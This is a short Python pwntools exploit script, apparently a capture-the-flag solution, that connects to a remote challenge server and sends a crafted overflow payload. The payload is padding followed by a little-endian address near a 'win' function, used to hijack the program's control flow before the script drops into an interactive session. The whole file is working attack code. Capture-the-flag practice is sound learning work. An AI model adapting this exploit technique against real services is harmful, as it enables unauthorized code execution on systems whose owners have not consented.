from pwn import *

# context.log_level = 'debug'

# p = process('./chal')
p = remote('chal.amt.rs',1337)

win = 0x4012a0

pay = chr(0x1ff6)*0x409 + 'a'*3
pay += chr(0xa4) + chr(0x12) + chr(0x40) + chr(0)*5

p.sendline(pay)

p.interactive()